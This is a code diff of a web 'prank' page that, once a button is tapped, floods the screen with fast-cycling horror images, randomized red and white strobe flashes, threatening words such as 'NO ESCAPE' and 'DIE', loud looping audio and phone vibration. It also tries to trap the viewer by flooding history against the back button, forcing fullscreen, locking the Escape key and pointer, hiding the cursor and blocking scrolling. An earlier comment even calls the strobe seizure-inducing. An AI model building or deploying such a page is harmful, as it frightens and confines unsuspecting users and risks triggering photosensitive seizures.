@@ -14,6 +14,7 @@
             user-select: none;
             -webkit-tap-highlight-color: transparent;
             -webkit-touch-callout: none;
+            cursor: none; /* Hide cursor globally */
         }
 
         html, body {
@@ -49,7 +50,7 @@
             align-items: center;
             z-index: 100;
             transition: opacity 0.2s ease-out;
-            overflow: hidden;
+            cursor: default; /* Show cursor only here */
         }
 
         .orb {
@@ -146,7 +147,7 @@
         @keyframes fall { to { transform: translateY(100vh) rotate(720deg); } }
 
         /* =========================================
-           LAYER 2: CHAOS & HORROR LAYERS
+           LAYER 2: NIGHTMARE ENGINE
            ========================================= */
         #chaos-layer {
             position: fixed;
@@ -157,9 +158,37 @@
             background: #000;
             z-index: 1;
             display: none;
+            /* This allows us to invert/corrupt the whole screen */
+            will-change: filter, transform;
         }
 
-        /* KEXART STYLE JITTER ANIMATION */
+        /* ANALOG NOISE OVERLAY */
+        #noise-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 8;
+            opacity: 0.15;
+            pointer-events: none;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+            display: none;
+        }
+
+        /* DARK VIGNETTE */
+        #vignette {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            box-shadow: inset 0 0 150px rgba(0,0,0,0.9);
+            z-index: 7;
+            pointer-events: none;
+            display: none;
+        }
+
         .loop-img {
             position: absolute;
             top: 0;
@@ -168,47 +197,30 @@
             height: 100%;
             object-fit: cover;
             display: none;
-            will-change: transform; /* Performance Boost */
         }
         
         .loop-img.active { 
             display: block; 
-            animation: violent-shake 0.2s infinite;
+            /* Subtle zoom breathing to make it feel alive */
+            animation: pulse-terror 0.1s infinite alternate;
         }
 
-        @keyframes violent-shake {
-            0% { transform: translate(0, 0) scale(1.02); }
-            25% { transform: translate(-5px, 5px) scale(1.05); }
-            50% { transform: translate(5px, -5px) scale(1.02); }
-            75% { transform: translate(-5px, -5px) scale(1.05); }
-            100% { transform: translate(0, 0) scale(1.02); }
+        @keyframes pulse-terror {
+            from { transform: scale(1.0); }
+            to { transform: scale(1.05); }
         }
 
-        /* STROBE LAYER */
-        #strobe-layer {
+        /* FLASH LAYER */
+        #flash-layer {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             background: white;
-            z-index: 5;
-            opacity: 0;
-            pointer-events: none;
-            display: none;
-        }
-        
-        #breach-layer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #8a0303;
             z-index: 10;
             opacity: 0;
             pointer-events: none;
-            display: none;
         }
 
         /* BLOOD TEXT LAYER */
@@ -217,27 +229,19 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-family: 'Impact', 'Arial Black', 'Segoe UI Black', sans-serif; 
+            font-family: 'Impact', 'Arial Black', sans-serif; 
             font-weight: 900;
             text-transform: uppercase;
-            z-index: 6;
+            z-index: 20;
             pointer-events: none;
             display: none;
             white-space: nowrap;
             color: #8a0303; 
-            text-shadow: 2px 2px 0px #380000;
-        }
-        
-        .dripping-blood {
-            animation: blood-drip-anim 1s infinite;
-        }
-        
-        @keyframes blood-drip-anim {
-            0% { text-shadow: 2px 2px 0px #380000, 0 0 10px #ff0000; }
-            50% { text-shadow: 2px 20px 5px rgba(138, 3, 3, 0.8), 0 0 20px #ff0000; }
-            100% { text-shadow: 2px 40px 10px rgba(138, 3, 3, 0), 0 0 5px #ff0000; }
+            text-shadow: 4px 4px 0px #000;
+            mix-blend-mode: exclusion; /* Makes text look "burnt" into image */
         }
 
+        /* Anti-Escape Overlay */
         #trap-net {
             position: fixed;
             top: 0;
@@ -270,8 +274,9 @@
 
     <!-- HORROR UI -->
     <div id="chaos-layer"></div>
-    <div id="strobe-layer"></div>
-    <div id="breach-layer"></div>
+    <div id="noise-layer"></div>
+    <div id="vignette"></div>
+    <div id="flash-layer"></div>
     <div id="glitch-text"></div>
     <div id="trap-net"></div>
 
@@ -279,23 +284,23 @@
         // CONFIGURATION
         const CONFIG = {
             imageCount: 15,          
-            loopSpeed: 60,  // Slightly adjusted for better render sync
             fileExt: '.jpg'
         };
 
-        const CREEPY_WORDS = ["I SEE YOU", "RUN", "HELP", "DIE", "LOOK BEHIND YOU", "666", "ERROR", "NO ESCAPE", "WAKE UP"];
-        const BLOOD_COLORS = ['#ff0000', '#cc0000', '#8a0303', '#4d0000', '#300000'];
+        const CREEPY_WORDS = ["I SEE YOU", "RUN", "HELP", "DIE", "BEHIND YOU", "666", "ERROR", "NO ESCAPE", "WAKE UP", "IT HURTS", "DON'T LOOK"];
+        const BLOOD_COLORS = ['#ff0000', '#cc0000', '#8a0303', '#4d0000'];
 
         // ELEMENTS
         const innocentLayer = document.getElementById('innocent-layer');
         const chaosLayer = document.getElementById('chaos-layer');
-        const strobeLayer = document.getElementById('strobe-layer');
-        const breachLayer = document.getElementById('breach-layer');
+        const flashLayer = document.getElementById('flash-layer');
         const glitchText = document.getElementById('glitch-text');
         const triggerBtn = document.getElementById('trigger-btn');
         const loadStatus = document.getElementById('load-status');
         const chaosContainer = document.getElementById('chaos-layer');
         const audio = document.getElementById('bg-audio');
+        const noiseLayer = document.getElementById('noise-layer');
+        const vignette = document.getElementById('vignette');
         const trapNet = document.getElementById('trap-net');
 
         let images = [];
@@ -329,14 +334,12 @@
             isPrankActive = true;
             innocentLayer.style.display = 'none';
             chaosLayer.style.display = 'block';
+            noiseLayer.style.display = 'block';
+            vignette.style.display = 'block';
             trapNet.style.display = 'block';
-            
-            strobeLayer.style.display = 'block';
             glitchText.style.display = 'block';
-            glitchText.classList.add('dripping-blood');
 
-            // --- THE TRAP: HISTORY FLOOD ---
-            // This fills the back button history so they can't swipe back
+            // TRAP: FLOOD HISTORY
             try {
                 history.pushState(null, document.title, location.href);
                 window.addEventListener('popstate', function (event) {
@@ -347,82 +350,115 @@
             forceFullscreen();
             audio.volume = 1.0;
             audio.play();
-            startChaosLoop();
+            
+            // Start the non-linear horror loop
+            nightmareLoop();
         });
 
-        function startChaosLoop() {
-            let tick = 0;
-            setInterval(() => {
-                images[activeIndex].classList.remove('active');
+        function nightmareLoop() {
+            if(!isPrankActive) return;
+
+            // 1. Advance Image
+            images[activeIndex].classList.remove('active');
+            
+            // Random jump logic: Sometimes skip images to look glitchy
+            if(Math.random() > 0.8) {
+                activeIndex = Math.floor(Math.random() * images.length);
+            } else {
                 activeIndex++;
                 if(activeIndex >= images.length) activeIndex = 0;
-                images[activeIndex].classList.add('active');
+            }
+            images[activeIndex].classList.add('active');
 
-                // Vibration (Mobile Only)
-                try { if (navigator.vibrate) navigator.vibrate(50); } catch(e){}
+            // 2. Visual Corruption (Randomly apply CSS filters)
+            const chaosRoll = Math.random();
+            if (chaosRoll > 0.9) {
+                // Invert Colors
+                chaosLayer.style.filter = "invert(100%) contrast(150%)";
+            } else if (chaosRoll > 0.8) {
+                // Deep Red Saturation
+                chaosLayer.style.filter = "sepia(100%) saturate(500%) hue-rotate(-50deg)";
+            } else if (chaosRoll > 0.7) {
+                // Blur shock
+                chaosLayer.style.filter = "blur(5px)";
+            } else {
+                // Normal
+                chaosLayer.style.filter = "contrast(120%) brightness(110%)";
+            }
 
-                // Strobe Sync (Every 2nd frame for seizure-inducing strobe, careful!)
-                tick++;
-                strobeLayer.style.opacity = (tick % 2 === 0) ? '0.1' : '0';
+            // 3. Strobe Flash (Randomized)
+            if (Math.random() > 0.7) {
+                flashLayer.style.opacity = Math.random() * 0.5; // Flicker
+                flashLayer.style.background = Math.random() > 0.8 ? "red" : "white";
+            } else {
+                flashLayer.style.opacity = 0;
+            }
 
-                // Random Blood Text
-                if (Math.random() > 0.65) {
-                    glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
-                    glitchText.style.fontSize = (Math.random() * 5 + 3) + 'rem';
-                    glitchText.style.color = BLOOD_COLORS[Math.floor(Math.random() * BLOOD_COLORS.length)];
-                    
-                    const randX = Math.floor(Math.random() * 80) + 10;
-                    const randY = Math.floor(Math.random() * 80) + 10;
-                    glitchText.style.left = randX + '%';
-                    glitchText.style.top = randY + '%';
-                }
+            // 4. Glitch Text (Random words, sizes, positions)
+            if (Math.random() > 0.5) {
+                glitchText.style.display = 'block';
+                glitchText.innerText = CREEPY_WORDS[Math.floor(Math.random() * CREEPY_WORDS.length)];
+                glitchText.style.fontSize = (Math.random() * 6 + 2) + 'rem';
+                glitchText.style.color = BLOOD_COLORS[Math.floor(Math.random() * BLOOD_COLORS.length)];
+                
+                // Jitter position
+                const randX = 50 + (Math.random() * 20 - 10);
+                const randY = 50 + (Math.random() * 20 - 10);
+                glitchText.style.left = randX + '%';
+                glitchText.style.top = randY + '%';
+                
+                // Rotation
+                glitchText.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 20 - 10}deg)`;
+            } else {
+                glitchText.style.display = 'none';
+            }
 
-            }, CONFIG.loopSpeed);
+            // 5. Vibration (Mobile)
+            if (navigator.vibrate && Math.random() > 0.5) navigator.vibrate(50);
+
+            // 6. VARIABLE SPEED (The "Kexart" feel)
+            // Sometimes it's super fast (30ms), sometimes it pauses (150ms)
+            const nextFrameTime = Math.random() > 0.9 ? 150 : (30 + Math.random() * 40);
+
+            setTimeout(nightmareLoop, nextFrameTime);
         }
 
         async function forceFullscreen() {
             const doc = document.documentElement;
-            // Attempt standard fullscreen
             try {
                 if (doc.requestFullscreen) await doc.requestFullscreen();
                 else if (doc.webkitRequestFullscreen) await doc.webkitRequestFullscreen();
             } catch(e) {}
             
-            // Attempt Keyboard Lock (Desktop)
             try {
                 if (navigator.keyboard && navigator.keyboard.lock) {
                     await navigator.keyboard.lock(['Escape']);
                 }
             } catch(e) {}
             
-            // Attempt Pointer Lock (Desktop)
             try { document.body.requestPointerLock(); } catch(e) {}
         }
 
         // --- SELF-HEALING / READJUSTMENT LOGIC ---
         function handleBreach() {
             if (!isPrankActive) return;
-
-            // Trigger Red Flash
-            breachLayer.style.display = 'block';
-            breachLayer.style.opacity = '0.5';
-            setTimeout(() => { breachLayer.style.opacity = '0'; }, 200);
-
-            // Change text
+            
+            // Punishment for resizing/escaping
+            flashLayer.style.background = "red";
+            flashLayer.style.opacity = "0.8";
+            
             glitchText.innerText = "NO ESCAPE";
-            glitchText.style.color = "#ff0000";
-            glitchText.style.fontSize = "5rem";
-            glitchText.style.left = "50%";
-            glitchText.style.top = "50%";
-
+            glitchText.style.fontSize = "6rem";
+            glitchText.style.display = "block";
+            
             window.scrollTo(0, 0);
             forceFullscreen();
+            
+            setTimeout(() => { flashLayer.style.opacity = "0"; }, 100);
         }
 
         window.addEventListener('resize', handleBreach);
-        if (window.visualViewport) {
-            window.visualViewport.addEventListener('resize', handleBreach);
-        }
+        if (window.visualViewport) window.visualViewport.addEventListener('resize', handleBreach);
 
         // Prevent Scroll/Touch Navigation
         document.body.addEventListener('touchmove', function(e) {
@@ -438,7 +474,7 @@
             });
         });
 
-        // Loop background audio force
+        // Ensure Audio Loops
         audio.addEventListener('ended', function() {
             this.currentTime = 0;
             this.play();
